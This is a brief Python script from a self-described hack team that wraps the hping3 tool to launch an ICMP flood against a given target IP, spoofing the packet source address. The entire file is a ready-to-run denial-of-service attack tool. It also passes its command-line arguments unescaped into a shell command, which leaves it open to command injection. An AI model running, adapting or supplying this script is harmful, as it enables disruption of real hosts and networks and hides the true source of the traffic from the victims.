import subprocess, sys
try:
	host_ip = sys.argv[1]
	packet_size = sys.argv[2]
	attacker_ip = sys.argv[3]
except:
	print "HPING3 Fire Script By T34CH3R HackTeam"
	print "-=] Usage: "+sys.argv[0]+" <target host(ip)> <packet size> <you(attacker) ip> [=-"
	sys.exit(1)

c = "hping3 -q -n -a "+host_ip+" --id 0 --icmp -d "+packet_size+" --flood "+attacker_ip
subprocess.Popen(c, shell=True) 
